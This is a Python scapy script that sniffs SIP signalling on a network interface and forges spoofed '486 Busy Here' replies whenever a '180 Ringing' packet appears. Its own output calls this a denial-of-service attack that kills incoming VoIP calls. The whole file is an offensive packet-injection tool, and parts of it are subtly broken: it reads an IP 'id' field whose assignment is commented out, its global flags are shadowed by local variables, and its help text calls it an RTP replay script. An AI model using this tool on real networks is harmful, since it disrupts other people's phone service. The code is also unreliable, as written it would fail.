from scapy.all import sniff, Ether, IP, UDP, sendp, ICMP, rdpcap, Raw
import scapy.fields
import re
import codecs
import argparse
import time
import signal


# global flag to listen for ACK after BUSY was sent
sent_busy=False

interrupt=False

def busy_timeout():
    interrupt=True


def traffic_parser(packet):
    BUSY_1 = r'SIP/2.0 486 Busy Here'
    BUSY_2 = r'X-Asterisk-HangupCause: Call Rejected\r\nX-Asterisk-HangupCauseCode: 21'

    payload = packet[UDP].payload.load

    sent_busy=False
    print(payload)
    # print(payload.decode("utf-8-sig"))
    payload = payload.decode("utf-8")

    print("----------------------------------------------------------------------")


    Ringing_header=re.findall("Ringing", str(payload))
    ACK_header=re.findall("ACK", str(payload))

    if Ringing_header:

        sent_busy=True
        print("New call detected.\nAttempting denial of service with Busy reply from Receiver")
        
        eth_attributes={}
        eth_attributes['dst']=packet[Ether].dst
        eth_attributes['src']=packet[Ether].src
        eth_attributes['type']=packet[Ether].type
        
        eth = Ether_layer(eth_attributes)


        udp_attributes={}
        udp_attributes['sport']=packet[UDP].sport
        udp_attributes['dport']=packet[UDP].dport
        udp_attributes['len']=491
    
        udp = UDP_layer(udp_attributes)


        # print(payload)
        
        # Implement packet modification
        payload = payload.replace(r"SIP/2.0 180 Ringing", BUSY_1, 1)
        payload = re.sub(r"Contact\:.*>", BUSY_2, payload,1)
        # print(payload.replace('\\\\', '\\'))
        # payload = payload.replace("\\\\", "\\")
        # print(payload.encode("ascii","ignore"))

        # time.sleep(1)

        for incr in range(1,5):

            ip_attributes={}
            ip_attributes['version']=packet[IP].version
            ip_attributes['tos']=packet[IP].tos
            ip_attributes['len']=511 #packet[IP].len
            # ip_attributes['id']=packet[IP].id+incr
            ip_attributes['flags']=packet[IP].flags
            ip_attributes['frag']=packet[IP].frag
            ip_attributes['ttl']=packet[IP].ttl
            ip_attributes['proto']=packet[IP].proto
            ip_attributes['src']=packet[IP].src
            ip_attributes['dst']=packet[IP].dst

            ip = IP_layer(ip_attributes)
            

            sendp(eth/ip/udp/Raw(load=payload)  )

            # print(payload)
            # print(Raw(load=payload))
            sent_busy=True
            busy_timeout=False
        signal.alarm(2)
    
    elif ACK_header:

        if sent_busy and (not busy_timeout):
            print("Busy message attack was successfull!")



def Ether_layer(attributes):
    layer2=Ether()
    layer2.dst=attributes['dst']
    layer2.src=attributes['src']
    layer2.type=attributes['type']

    return layer2


def IP_layer(attributes):
    layer3=IP()
    layer3.version=attributes['version']
    # layer3.ihl=attributes['ihl']
    layer3.tos=attributes['tos']
    layer3.len=attributes['len']
    layer3.id=attributes['id']
    layer3.flags=attributes['flags']
    layer3.frag=attributes['frag']
    layer3.ttl=attributes['ttl']
    layer3.proto=attributes['proto']
    layer3.src=attributes['src']
    layer3.dst=attributes['dst']

    return layer3


def UDP_layer(attributes):
    layer4=UDP()
    layer4.sport=attributes['sport']
    layer4.dport=attributes['dport']
    layer4.len=attributes['len']

    return layer4


parser = argparse.ArgumentParser(description="rtp replay script. Arguments: -i <interface> -f <sniff filter> -o <sniff outputfile> Interface defaults to 'eth0' and filter defaults to 'udp and port 5060'")
parser.add_argument('-i', "--interface", default="eth0", help="interface to use for sniffing")
parser.add_argument('-f', '--filter', default="udp and port 5060", help="filter to be used in scapy")
parser.add_argument('-o', "--outfile", help="output file (optional)")
parser.add_argument('-t', "--testfile", help="parse test file (optional)")
args=parser.parse_args()

if __name__ == '__main__':

    signal.signal(signal.SIGALRM, busy_timeout)

    if args.testfile:
        packets = rdpcap(args.testfile)
        for packet in packets:
            traffic_parser(packet)
    else:
        sniff(iface=args.interface, prn=traffic_parser, filter="udp and port 5060", store=0)
